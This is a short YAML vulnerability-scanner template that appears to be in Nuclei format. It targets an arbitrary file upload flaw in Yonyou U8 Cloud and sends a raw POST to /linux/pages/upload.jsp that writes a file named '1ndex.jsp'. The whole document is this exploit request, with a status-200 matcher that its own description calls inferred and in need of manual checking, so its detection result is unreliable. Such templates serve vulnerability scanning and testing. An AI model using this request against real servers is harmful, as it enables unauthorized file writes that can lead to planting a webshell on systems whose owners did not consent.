id: poc-07c44c7a922e136ce16a
info:
  name: 用友U8Cloudupload任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /linux/pages/upload.jsp HTTP/1.1

    Content-Type: application/x-www-form-urlencoded

    Filename: 1ndex.jsp

    User-Agent: Java/1.8.0_381

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 6

    Connection: close


    123456'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
